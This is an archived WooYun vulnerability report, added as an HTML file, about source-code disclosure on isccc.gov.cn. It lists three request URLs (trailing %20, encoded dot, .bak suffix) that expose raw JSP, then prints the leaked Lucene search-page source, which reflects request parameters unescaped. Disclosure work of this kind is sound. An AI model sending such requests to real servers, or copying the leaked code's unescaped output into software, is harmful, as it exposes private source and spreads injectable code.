@@ -1,0 +1,641 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		中国信息安全认证中心源代码泄露漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		中国信息安全认证中心源代码泄露漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/akast">akast</a> 
+</li><li>提交时间：		2011-05-02 13:05</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-05-02：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2011-05-02：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">中国信息安全认证中心源代码泄露漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://www.isccc.gov.cn/turbosearch/search.jsp%20<br />
+<br />
+http://www.isccc.gov.cn/turbosearch/search.jsp%2e<br />
+<br />
+http://www.isccc.gov.cn/turbosearch/search.jsp.bak </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=utf-8&quot; %&gt;<br />
+&lt;%@ page import=&quot;org.apache.lucene.analysis.*,org.apache.lucene.analysis.cn.*,org.apache.lucene.document.*,org.apache.lucene.index.*,org.apache.lucene.search.*,org.apache.lucene.search.highlight.*,org.apache.lucene.queryParser.*,com.turbosearch.plugin.htmlparser.Entities,TurboCMS.tools.*,org.apache.lucene.document.DateTools.*,com.turbosearch.action.SystemSetAction&quot; %&gt;<br />
+&lt;%@ page import=&quot;java.text.*,java.util.*,java.io.*&quot;%&gt;<br />
+&lt;%@ page import=&quot;com.turbosearch.tools.FileLoader&quot;%&gt;<br />
+&lt;%@ page import=&quot;com.turbosearch.action.IndexTaskAction;&quot;%&gt;<br />
+&lt;%!public String getContent(String url) throws Exception{<br />
+	String retv=&quot;&quot;;<br />
+	try{<br />
+		FileLoader fl = FileLoader.getInstance();<br />
+		url = Config.SiteDirectory + url;<br />
+		retv = fl.getContent(url);<br />
+	}catch(Exception e){<br />
+		retv = e.getMessage();<br />
+	}<br />
+	return(retv);<br />
+}<br />
+public static String GetDateString(String FieldValue) throws Exception{<br />
+	String sDate=&quot;&quot;;<br />
+	if(FieldValue==null||FieldValue.equals(&quot;null&quot;)) return(&quot;&quot;);<br />
+	try{<br />
+		sDate = sDate + FieldValue.substring(0,4) + &quot;-&quot;;<br />
+        sDate = sDate + FieldValue.substring(4,6) + &quot;-&quot;;<br />
+		sDate = sDate + FieldValue.substring(6,8) + &quot; &quot;;<br />
+		sDate = sDate + FieldValue.substring(8,10) + &quot;:&quot;;<br />
+		sDate = sDate + FieldValue.substring(10,12) + &quot;:&quot;;<br />
+		//sDate = sDate + FieldValue.substring(12,14) + &quot;:&quot;;<br />
+	}catch(Exception e){<br />
+		sDate = FieldValue;<br />
+	}<br />
+	return(sDate);<br />
+}<br />
+public static String gDate(String dstr) throws Exception{<br />
+	String sdate = &quot;&quot;;<br />
+	try{<br />
+		SimpleDateFormat f = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm&quot;);<br />
+		java.util.Date d = f.parse(dstr);<br />
+		d = Config.DateAdd(d,28800);<br />
+		sdate = Config.GetDateString(d).substring(0,16);<br />
+	}catch(Exception e){<br />
+		sdate = dstr;<br />
+	}<br />
+	return(sdate);<br />
+}%&gt;<br />
+<br />
+&lt;%<br />
+request.setCharacterEncoding(&quot;UTF-8&quot;);<br />
+%&gt;<br />
+&lt;%<br />
+    class CachedIndex {		// an entry in the cache<br />
+    IndexReader reader;		// an open reader<br />
+    long modified;		 	// reader&#039;s modified date<br />
+    <br />
+    public CachedIndex(String name) throws Exception {<br />
+      modified = IndexReader.lastModified(name);  	// get modified date<br />
+      reader = IndexReader.open(name);		  		// open reader<br />
+    }<br />
+  }<br />
+<br />
+long t0,t1;<br />
+t0 = System.currentTimeMillis();<br />
+	Analyzer analyzer = new ChineseAnalyzer();    <br />
+	Highlighter highlighter =null;<br />
+	String strSummary;<br />
+	String catalog = &quot;&quot;;<br />
+	<br />
+	if(request.getParameter(&quot;catalog&quot;)==null){<br />
+%&gt;&lt;script&gt;alert(&quot;参数错误！&quot;);window.close();&lt;/script&gt;&lt;%<br />
+		}else{<br />
+		catalog = request.getParameter(&quot;catalog&quot;);<br />
+	}<br />
+	//catalog=&quot;hs3w&quot;;<br />
+	if(catalog.trim().equals(&quot;&quot;)||catalog.trim().length()==0){<br />
+%&gt;&lt;script&gt;alert(&quot;参数错误！&quot;);window.close();&lt;/script&gt;&lt;%<br />
+	}else{<br />
+	String catalogs[];<br />
+	if(catalog.indexOf(&quot;,&quot;)&gt;-1) <br />
+		catalogs = catalog.split(&quot;,&quot;); <br />
+	else{<br />
+		catalogs = new String[] {&quot;&quot;};<br />
+		catalogs[0] = catalog;<br />
+	}<br />
+<br />
+<br />
+	IndexSearcher searchers[];<br />
+	searchers = new IndexSearcher[catalogs.length];<br />
+	SystemSetAction catalogcfg = new SystemSetAction();<br />
+	for(int i=0;i&lt;catalogs.length;i++){<br />
+		<br />
+		String indexPath = catalogcfg.getIndexBaseDir()+&quot;/&quot;+catalogs[i];<br />
+		CachedIndex index = new CachedIndex(indexPath);<br />
+		IndexReader reader = index.reader;<br />
+		searchers[i] = new IndexSearcher(reader);<br />
+	}<br />
+<br />
+<br />
+	MultiSearcher searcher = new MultiSearcher(searchers);<br />
+<br />
+	String qtype = request.getParameter(&quot;qtype&quot;);<br />
+	if(qtype==null|| qtype.trim().length()==0) qtype=&quot;contents&quot;;<br />
+	String queryString = request.getParameter(&quot;query&quot;);<br />
+	if (queryString == null || queryString.trim().length()==0 ){<br />
+   		out.print(&quot;&lt;br&gt;&lt;br&gt;&lt;p align=&#039;center&#039;&gt;没有输入搜索条件!&lt;/p&gt;&quot;);<br />
+   		return;<br />
+	}else if(queryString.equals(&quot;-&quot;)||queryString.equals(&quot;+&quot;)){<br />
+		out.print(&quot;&lt;br&gt;&lt;br&gt;&lt;p align=&#039;center&#039;&gt;搜索条件有错误!&lt;/p&gt;&quot;);<br />
+		return;<br />
+	}<br />
+<br />
+	int start = 0;		  // first hit to display<br />
+	String startString = request.getParameter(&quot;start&quot;);<br />
+	if (startString != null) start = Integer.parseInt(startString);<br />
+<br />
+	int hitsPerPage = 20;		  // number of hits to display<br />
+	String hitsString = request.getParameter(&quot;hitsPerPage&quot;);<br />
+	if (hitsString != null) hitsPerPage = Integer.parseInt(hitsString);<br />
+<br />
+	boolean showSummaries = true;	  // show summaries<br />
+	if (request.getParameter(&quot;showSummaries&quot;)!=null&amp;&amp;&quot;false&quot;.equals(request.getParameter(&quot;showSummaries&quot;)))<br />
+		showSummaries = false;<br />
+<br />
+	Query query = null;<br />
+	try {//多field检索<br />
+		String field[] = new String[]{&quot;&quot;,&quot;&quot;,&quot;&quot;};<br />
+		if(qtype.equals(&quot;contents&quot;)) field[0] = &quot;contents&quot;;<br />
+		if(qtype.equals(&quot;title&quot;)) field[0] = &quot;title&quot;;<br />
+		if(qtype.equals(&quot;all&quot;)){<br />
+	field[0] = &quot;contents&quot;;<br />
+	field[1] = &quot;title&quot;;<br />
+		}<br />
+		//field[2]=&quot;channel&quot;;<br />
+		query = (new MultiFieldQueryParser(field,analyzer)).parse(queryString);<br />
+	} catch (Exception e) {	  // error parsing query<br />
+     out.println(&quot;&lt;br&gt;&lt;br&gt;处理搜索条件时出错&lt;br&gt;搜索条件：&quot;);<br />
+     out.println(queryString);<br />
+     out.println(&quot;&lt;br&gt;------------------------------------------&quot;);<br />
+     out.println(e.getMessage());<br />
+     return;<br />
+   }<br />
+<br />
+	//时间段检索<br />
+	DateFormat df = DateFormat.getDateInstance();<br />
+	String qdate =&quot;&quot; ;<br />
+	String date1 =&quot;&quot; ;<br />
+	String date2 = &quot;&quot;;<br />
+	if(request.getParameter(&quot;qdate&quot;)==null||request.getParameter(&quot;qdate&quot;).equals(&quot;&quot;)) <br />
+		qdate = &quot;modified&quot;; <br />
+	else <br />
+		qdate = request.getParameter(&quot;qdate&quot;);<br />
+	if(request.getParameter(&quot;date1&quot;)==null||request.getParameter(&quot;date1&quot;).equals(&quot;&quot;)) <br />
+		date1 = &quot;2000-01-09&quot;; <br />
+	else <br />
+		date1 = request.getParameter(&quot;date1&quot;);<br />
+	if(request.getParameter(&quot;date2&quot;)==null||request.getParameter(&quot;date2&quot;).equals(&quot;&quot;)) <br />
+		date2 = Config.GetDateString(Config.Now()).substring(0,10);<br />
+	else <br />
+		date2 = request.getParameter(&quot;date2&quot;);<br />
+	Date startdate = df.parse(date1);<br />
+	Date enddate = df.parse(date2);<br />
+	Term s1 = new Term(qdate,DateTools.dateToString(Config.DateAdd(&quot;d&quot;,-1,startdate),Resolution.SECOND));<br />
+	Term s2 = new Term(qdate,DateTools.dateToString(Config.DateAdd(&quot;d&quot;,1,enddate),Resolution.SECOND));<br />
+	Term s3 = new Term(&quot;channel&quot;,&quot;新闻中心&quot;);<br />
+	RangeQuery rangeQuery = new RangeQuery(s1, s2, true);<br />
+	BooleanQuery bquery = new BooleanQuery();<br />
+	TermQuery tquery = new TermQuery(s3);<br />
+	bquery.add(query,BooleanClause.Occur.MUST);<br />
+	bquery.add(rangeQuery,BooleanClause.Occur.MUST);<br />
+	//bquery.add(tquery,BooleanClause.Occur.MUST);<br />
+  <br />
+	Hits hits;<br />
+	//按某一顺序排序<br />
+	String qsort;<br />
+	qsort = request.getParameter(&quot;qsort&quot;);<br />
+	if(qsort==null||qsort.equals(&quot;&quot;)) qsort=&quot;RELEVANCE&quot;;<br />
+	Sort sort=null;<br />
+	if(qsort.equals(&quot;RELEVANCE&quot;))<br />
+		sort = Sort.RELEVANCE;		//使用Lucene默认的排序<br />
+		//sort = Sort.INDEXORDER;	//根据IndexOrder排序<br />
+		//sort = new Sort(&quot;modified&quot;,true);	//根据文件的更新时间排序<br />
+	if(qsort.equals(&quot;modified&quot;))<br />
+		sort = new Sort(new SortField[]{new SortField(&quot;modified&quot;, SortField.STRING, true)});<br />
+	if(qsort.equals(&quot;pubdate&quot;))<br />
+		sort = new Sort(new SortField[]{new SortField(&quot;pubdate&quot;, SortField.STRING, true)});<br />
+   <br />
+	hits = searcher.search(bquery,sort);<br />
+	try{<br />
+		SimpleHTMLFormatter simpleHTMLFormatter = new SimpleHTMLFormatter(&quot;&lt;font color=#e10900&gt;&quot;,&quot;&lt;/font&gt;&quot;);   <br />
+		//SimpleHTMLFormatter simpleHTMLFormatter = new SimpleHTMLFormatter();   <br />
+		highlighter = new Highlighter(simpleHTMLFormatter,new QueryScorer(query));      	<br />
+		highlighter.setTextFragmenter(new SimpleFragmenter(2000));<br />
+		//highlighter.setTextFragmenter(new NullFragmenter());<br />
+	}catch(Exception eee){<br />
+		System.out.println(eee.getMessage());<br />
+	}<br />
+<br />
+	int tpg = (int)Math.ceil((hits.length() + hitsPerPage-1) / hitsPerPage);<br />
+    String pgg=request.getParameter(&quot;pg&quot;);<br />
+	int pg=1;<br />
+	if(pgg==null||pgg.equals(&quot;&quot;)){ <br />
+		pg=start/10+1;<br />
+	}else{<br />
+		pg=Integer.parseInt(pgg);<br />
+		if(pg&gt;tpg) pg=tpg;<br />
+		if(pg&lt;1) pg = 1;<br />
+		start = (pg-1)*hitsPerPage;<br />
+	}<br />
+    int end = Math.min(hits.length(), start + hitsPerPage);<br />
+<br />
+   t1=System.currentTimeMillis();<br />
+%&gt;<br />
+&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br />
+&lt;title&gt;中国信息安全认证中心-全文检索&lt;/title&gt;<br />
+&lt;style type=&quot;text/css&quot;&gt;<br />
+body{ font-size:14px;}<br />
+td{	font-family: &quot;宋体&quot;;<br />
+	font-size: 12px;<br />
+	line-height: 20px;<br />
+	color: #000000;<br />
+	text-decoration: none;<br />
+}<br />
+&lt;/style&gt;<br />
+&lt;script language=&quot;javascript&quot;&gt;<br />
+function CheckAll(form) {<br />
+	for (var i=0;i&lt;form.elements.length;i++) {<br />
+		var e = form.elements[i];<br />
+		if (e.name.substring(0,5) !=&quot;chkall&quot; &amp;&amp; e.type==&quot;checkbox&quot; &amp;&amp; e.name!=&quot;showSummaries&quot;){<br />
+			e.checked = document.getElementsByName(&quot;chkall&quot;)[0].checked;<br />
+		}<br />
+	}<br />
+}<br />
+function check(){<br />
+	if(fm.query.value==&quot;&quot;){<br />
+		alert(&quot;请输入要检索的内容！&quot;);<br />
+		fm.query.focus();<br />
+		return(false);<br />
+	}<br />
+	<br />
+	<br />
+function selectdate(el){<br />
+	var args=&quot;font-size:10px;dialogWidth:286px;dialogHeight:290px;center:yes;status:no;help:no&quot;;<br />
+	var argu=new Array();<br />
+	&lt;%<br />
+	Calendar cal = Calendar.getInstance(); 	<br />
+	SimpleDateFormat sdf=new SimpleDateFormat(&quot;M-d-yyyy&quot;);<br />
+	%&gt;<br />
+	argu[0]=&quot;&lt;%=sdf.format(cal.getTime())%&gt;&quot;;<br />
+	var selectdate=window.showModalDialog(&quot;selectdate.htm&quot;,argu,args);<br />
+	if (selectdate!=null)<br />
+	  el.value=selectdate;<br />
+	}<br />
+&lt;/script&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;%<br />
+//=getContent(&quot;/includes/head.html&quot;)<br />
+%&gt;<br />
+<br />
+&lt;table width=&quot;1002&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;<br />
+  &lt;tr&gt;<br />
+    &lt;td align=&quot;center&quot; valign=&quot;top&quot;&gt;&lt;iframe src=&quot;http://www.isccc.gov.cn/include/top_new.html&quot; frameborder=&quot;0&quot; height=&quot;283&quot; width=&quot;1002&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+&lt;/table&gt;<br />
+&lt;table width=&quot;1002&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;<br />
+  &lt;tr&gt;<br />
+  &lt;td width=&quot;776&quot; valign=&quot;top&quot;&gt;&lt;table width=&quot;776&quot; border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;<br />
+  <br />
+  &lt;tr&gt;<br />
+    &lt;td height=&quot;1&quot;&gt;&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+  &lt;tr&gt;<br />
+    &lt;td height=&quot;25&quot;&gt;&lt;table width=&quot;100%&quot;  border=&quot;0&quot; cellpadding=&quot;10&quot; cellspacing=&quot;1&quot; bgcolor=&quot;#CCCCCC&quot;&gt;<br />
+      &lt;tr&gt;<br />
+	    &lt;td width=&quot;75&quot; align=&quot;center&quot; valign=&quot;middle&quot; bgcolor=&quot;#FFFFFF&quot;&gt;&lt;b&gt;站&lt;BR&gt;内&lt;BR&gt;检&lt;BR&gt;索&lt;hr size=&quot;1&quot;&gt;<br />
+	    ISCCC网站&lt;/b&gt;&lt;/td&gt;<br />
+        &lt;td bgcolor=&quot;#FFFFFF&quot;&gt;<br />
+&lt;table border=&quot;0&quot; width=&quot;100%&quot;&gt;<br />
+	&lt;form name=&quot;fm&quot; method=&quot;post&quot; action=&quot;search.jsp&quot; onSubmit=&quot;return check()&quot;&gt;<br />
+		&lt;input type=&quot;hidden&quot; name=&quot;catalog&quot; value=&quot;isccc&quot;&gt; <br />
+        &lt;input type=&quot;hidden&quot; name=&quot;qtype&quot; value=&quot;all&quot;&gt; <br />
+	&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;<br />
+&lt;/td&gt;&lt;/tr&gt;<br />
+<br />
+&lt;tr&gt;&lt;td&gt;检索范围：&lt;/td&gt;&lt;td&gt;&lt;select name=&quot;qtype&quot;&gt;<br />
+	&lt;option value=&quot;contents&quot; selected&gt;在内容中检索<br />
+	&lt;option value=&quot;title&quot;&gt;在标题中检索<br />
+	&lt;option value=&quot;all&quot;&gt;在标题和内容中检索<br />
+&lt;/select&gt;&amp;nbsp;&amp;nbsp;&lt;select name=&quot;qdate&quot;&gt;<br />
+	&lt;option value=&quot;pubdate&quot;&gt;文章发布时间<br />
+	&lt;option value=&quot;modified&quot; selected&gt;文章更新时间<br />
+&lt;/select&gt;从&lt;input type=&quot;text&quot; value=&quot;&lt;%=date1%&gt;&quot; name=&quot;date1&quot; size=&quot;12&quot;&gt;&lt;img src=&quot;images/calendar.gif&quot; onClick=&quot;selectdate(date1);&quot; style=&quot;cursor:hand&quot; title=&quot;点击选择时间&quot;&gt;到&lt;input type=&quot;text&quot; value=&quot;&lt;%=date2%&gt;&quot; name=&quot;date2&quot;  size=&quot;12&quot;&gt;&lt;img src=&quot;images/calendar.gif&quot; onClick=&quot;selectdate(date2);&quot; style=&quot;cursor:hand&quot; title=&quot;点击选择时间&quot;&gt;之间&lt;/td&gt;&lt;/tr&gt;<br />
+&lt;tr&gt;&lt;td&gt;检索设置：&lt;/td&gt;&lt;td&gt;每页显示&lt;input type=&quot;text&quot; name=&quot;hitsPerPage&quot; value=&quot;20&quot; size=&quot;4&quot; style=&quot;text-align:center&quot;&gt;篇&amp;nbsp;&amp;nbsp;<br />
+&lt;input type=&quot;checkbox&quot; name=&quot;showSummaries&quot; value=&quot;false&quot; id=&quot;showsum&quot;&gt;&lt;label for=&quot;showsum&quot; style=&quot;cursor:hand&quot;&gt;不显示摘要&lt;/label&gt;&amp;nbsp;&amp;nbsp;<br />
+&lt;select name=&quot;qsort&quot;&gt;<br />
+	&lt;option value=&quot;pubdate&quot; selected&gt;按文章发布时间排序<br />
+	&lt;option value=&quot;modified&quot;&gt;按文章更新时间排序<br />
+	&lt;option value=&quot;RELEVANCE&quot;&gt;按相关度排序<br />
+&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;<br />
+&lt;tr&gt;&lt;td&gt;关键字：&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot; size=&quot;50&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;input type=&quot;image&quot; src=&quot;images/search.gif&quot; value=&quot;检索&quot; name=&quot;search&quot;&gt;&lt;/td&gt;&lt;/tr&gt;<br />
+<br />
+	&lt;/form&gt;<br />
+&lt;/table&gt;<br />
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<br />
+	&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+  &lt;tr&gt;<br />
+    &lt;td height=&quot;5&quot;&gt;&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+  &lt;tr&gt;<br />
+    &lt;td&gt;<br />
+	<br />
+	&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+  &lt;tr&gt;<br />
+    &lt;td height=&quot;5&quot;&gt;&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+&lt;/table&gt;<br />
+<br />
+&lt;!--分页开始----&gt;<br />
+<br />
+&lt;table width=&quot;776&quot;  border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;<br />
+  &lt;tr&gt;<br />
+    &lt;td height=&quot;4&quot;&gt;&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+  &lt;tr&gt;<br />
+    &lt;td&gt; &lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+    &lt;tr&gt;<br />
+    &lt;td&gt;&lt;table width=&quot;100%&quot;  border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot; bgcolor=&quot;#CCCCCC&quot;&gt;<br />
+      &lt;tr&gt;<br />
+        &lt;td bgcolor=&quot;#FFFFFF&quot;&gt;&lt;table width=&quot;100%&quot;  border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;10&quot;&gt;<br />
+          &lt;tr&gt;<br />
+            &lt;td width=&quot;76%&quot; valign=&quot;top&quot;&gt;&lt;table width=&quot;100%&quot;  border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;<br />
+              &lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;<br />
+			  <br />
+&lt;/td&gt;&lt;/tr&gt;<br />
+			<br />
+&lt;%<br />
+			    for (int i = start; i &lt; end; i++) {		  // display the hits	<br />
+			    Document doc = hits.doc(i);<br />
+			    String title = doc.get(&quot;title&quot;);<br />
+			    if (title.equals(&quot;&quot;))	  // use url for docs w/o title<br />
+			      title = doc.get(&quot;url&quot;);<br />
+				  TokenStream ts = analyzer.tokenStream(&quot;title&quot;,new StringReader(title));<br />
+				  String tmps = &quot;&quot;;<br />
+				  try{<br />
+					  tmps = highlighter.getBestFragments(ts, title, 3, &quot;...&quot;);<br />
+				  }catch(Exception e){<br />
+					  tmps = &quot;&quot;;<br />
+				  }<br />
+				  if(!tmps.equals(&quot;&quot;)) title = tmps;<br />
+			      strSummary = doc.get(&quot;summary&quot;);<br />
+				  TokenStream ts2 = analyzer.tokenStream(&quot;summary&quot;,new StringReader(doc.get(&quot;summary&quot;)));<br />
+				  try{<br />
+					  tmps = highlighter.getBestFragments(ts2, doc.get(&quot;summary&quot;), 2, &quot;...&quot;);<br />
+					  //tmps = highlighter.getBestFragment(ts2, doc.get(&quot;summary&quot;));<br />
+				  }catch(Exception e){<br />
+					  //e.printStackTrace();<br />
+					  //System.out.println(e.getMessage());<br />
+					  tmps = &quot;&quot;;<br />
+				  }<br />
+				  if(!tmps.equals(&quot;&quot;)) strSummary = tmps;<br />
+			%&gt;			<br />
+			&lt;tr&gt;<br />
+             &lt;td width=&quot;80%&quot;&gt;&lt;%=i+1%&gt;.&lt;a href=&quot;&lt;%=doc.get(&quot;url&quot;)%&gt;&quot;&gt;&lt;%=title%&gt;&lt;/a&gt;&lt;/td&gt;&lt;td width=&quot;20%&quot; title=&quot;(更新时间：&lt;%=gDate(GetDateString(doc.get(&quot;modified&quot;)))%&gt;)&quot;&gt;&lt;%=gDate(GetDateString(doc.get(&quot;pubdate&quot;)))%&gt; &lt;!--(更新时间：&lt;%=gDate(GetDateString(doc.get(&quot;modified&quot;)))%&gt;)--&gt; &lt;/td&gt;<br />
+              &lt;/tr&gt;<br />
+			  &lt;%<br />
+			  if(showSummaries){<br />
+			  %&gt;<br />
+			  &lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;&lt;b&gt;摘要:&lt;/b&gt;&lt;%=strSummary%&gt;&lt;/td&gt;&lt;/tr&gt;<br />
+			  &lt;tr&gt;&lt;td&gt;&lt;a href=&quot;&lt;%=doc.get(&quot;url&quot;)%&gt;&quot; target=&quot;_blank&quot;&gt;&lt;%=(doc.get(&quot;description&quot;)==null)?&quot;&quot;:doc.get(&quot;description&quot;)%&gt;&lt;/a&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot; class=&quot;font_hei&quot; width=&quot;100&quot;&gt;相关度：&lt;%<br />
+			  out.print((int)(hits.score(i) * 100.0f));<br />
+			  %&gt;%&amp;nbsp;&lt;/tr&gt;		  <br />
+			  &lt;%<br />
+		  			  }<br />
+		  			  %&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot; height=&quot;1&quot; bgcolor=&quot;#EEEEEE&quot;&gt;&lt;/td&gt;&lt;/tr&gt;<br />
+&lt;%<br />
+}<br />
+%&gt;<br />
+<br />
+&lt;tr&gt;<br />
+    &lt;td align=&quot;center&quot; style=&quot;font-size:12px&quot; colspan=&quot;2&quot;&gt; <br />
+   &lt;form name=&quot;search&quot; method=&quot;post&quot;&gt;<br />
+   &lt;input type=&quot;hidden&quot; name=&quot;query&quot; value=&quot;&lt;%=Entities.encode(queryString)%&gt;&quot;&gt;<br />
+   &lt;input type=&quot;hidden&quot; name=&quot;start&quot; value=&quot;&lt;%=end%&gt;&quot;&gt;<br />
+   &lt;input type=&quot;hidden&quot; name=&quot;catalog&quot; value=&quot;&lt;%=catalog%&gt;&quot;&gt;<br />
+   &lt;input type=&quot;hidden&quot; name=&quot;hitsPerPage&quot; value=&quot;&lt;%=hitsPerPage%&gt;&quot;&gt;<br />
+   &lt;input type=&quot;hidden&quot; name=&quot;showSummaries&quot; value=&quot;&lt;%=showSummaries%&gt;&quot;&gt;<br />
+   &lt;input type=&quot;hidden&quot; name=&quot;qsort&quot; value=&quot;&lt;%=qsort%&gt;&quot;&gt; <br />
+   &lt;input type=&quot;hidden&quot; name=&quot;date1&quot; value=&quot;&lt;%=date1%&gt;&quot;&gt;<br />
+   &lt;input type=&quot;hidden&quot; name=&quot;date2&quot; value=&quot;&lt;%=date2%&gt;&quot;&gt;<br />
+   &lt;input type=&quot;hidden&quot; name=&quot;qdate&quot; value=&quot;&lt;%=qdate%&gt;&quot;&gt;<br />
+总&lt;%=hits.length()%&gt; 篇 ，共 &lt;%=(int)Math.ceil((hits.length() + hitsPerPage-1) / hitsPerPage)%&gt; 页  <br />
+   &lt;%<br />
+if (start&gt;0){<br />
+%&gt;<br />
+	 &lt;a href=&quot;#&quot; onClick=&quot;document.search.start.value=&lt;%=start-hitsPerPage%&gt;;document.search.submit();&quot; class=&quot;font_lv&quot;&gt;上一页&lt;/a&gt;<br />
+&lt;%<br />
+}else{<br />
+%&gt;&lt;font class=&quot;font_lv&quot;&gt;上一页&lt;/font&gt;&lt;%<br />
+}<br />
+%&gt;<br />
+&lt;a href=&quot;#&quot; onClick=&quot;document.search.start.value=0;document.search.submit();&quot;&gt;最首页&lt;/a&gt;<br />
+&lt;%<br />
+//开始显示分页代码<br />
+int tenp;<br />
+String sUrl=&quot;&quot;;<br />
+int pc=(int)Math.ceil((hits.length() + hitsPerPage -1) / hitsPerPage);<br />
+tenp=(int)Math.floor((pg-1)/10);<br />
+if (tenp&gt;0) //显示上10页<br />
+{%&gt;<br />
+ &lt;a href=&quot;#&quot;  onClick=&quot;document.search.pg.value=&lt;%=((tenp-1)*10+1)%&gt;;document.search.start.value=&lt;%=hitsPerPage*((tenp-1)*10)%&gt;;document.search.submit();&quot;&gt;上10页&lt;/a&gt; <br />
+&lt;%<br />
+}else{<br />
+%&gt;<br />
+上10页<br />
+&lt;%<br />
+}<br />
+int t=0;<br />
+if ((tenp+1)*10&gt;pc) t=pc; else t=(tenp+1)*10;<br />
+for (int i=tenp*10+1;i&lt;=t;i++)<br />
+{	<br />
+	if (pg==i)<br />
+	{<br />
+%&gt;		&lt;b&gt;&lt;font color=red&gt;&lt;%=pg%&gt;&lt;/font&gt;&lt;/b&gt;<br />
+&lt;%	}else{<br />
+%&gt;&lt;a href=&quot;#&quot;  onClick=&quot;document.search.pg.value=&lt;%=i%&gt;;document.search.start.value=&lt;%=hitsPerPage*(i-1)%&gt;;document.search.submit();&quot; class=a03&gt;&lt;%=i%&gt;&lt;/a&gt; <br />
+&lt;%}<br />
+}<br />
+if (tenp&lt;Math.floor(pc/10))  //显示下10页<br />
+{%&gt;<br />
+&lt;a href=&quot;#&quot;  onClick=&quot;document.search.pg.value=&lt;%=((tenp+1)*10+1)%&gt;;document.search.start.value=&lt;%=hitsPerPage*((tenp+1)*10)%&gt;;document.search.submit();&quot;  class=a03&gt;下10页&lt;/a&gt;  <br />
+&lt;%<br />
+}else{<br />
+%&gt;<br />
+下10页<br />
+&lt;%<br />
+}<br />
+%&gt;&lt;a href=&quot;#&quot;  onClick=&quot;document.search.pg.value=&lt;%=pc%&gt;;document.search.start.value=&lt;%=hitsPerPage*(pc-1)%&gt;;document.search.submit();&quot; class=a03&gt;最末页&lt;/a&gt;<br />
+&lt;%<br />
+if (end &lt; hits.length()) {			  // insert next page button<br />
+%&gt;<br />
+      &lt;!--&lt;input type=&quot;submit&quot; value=&quot;后一页&gt;&gt;&quot;&gt;--&gt;<br />
+	  &lt;a href=&quot;#&quot; onClick=&quot;document.search.submit();&quot; class=&quot;font_lv&quot;&gt;下一页&lt;/a&gt;<br />
+&lt;%<br />
+}else{<br />
+%&gt;&lt;font class=&quot;font_lv&quot;&gt;下一页&lt;/font&gt;&lt;%<br />
+}<br />
+%&gt;<br />
+&lt;/font&gt;&lt;input type=&quot;text&quot; name=&quot;pg&quot; size=&quot;3&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;<br />
+   &lt;/form&gt;<br />
+    &lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+			  <br />
+            &lt;/table&gt;&lt;/td&gt;<br />
+            &lt;/tr&gt;<br />
+        &lt;/table&gt;&lt;/td&gt;<br />
+      &lt;/tr&gt;<br />
+    &lt;/table&gt;&lt;/td&gt;<br />
+  &lt;/tr&gt;<br />
+&lt;/table&gt;<br />
+<br />
+&lt;!--分页结束--&gt;&lt;/td&gt;<br />
+    &lt;td width=&quot;226&quot; valign=&quot;top&quot;&gt;&lt;iframe src=&quot;http://www.isccc.gov.cn/include/left4.html&quot; frameborder=&quot;0&quot; height=&quot;500&quot; width=&quot;226&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;&lt;/td&gt;<br />
+    <br />
+  &lt;/tr&gt;<br />
+&lt;/table&gt;<br />
+<br />
+<br />
+<br />
+<br />
+&lt;!-------------------------------网页底部------------------------------------&gt;<br />
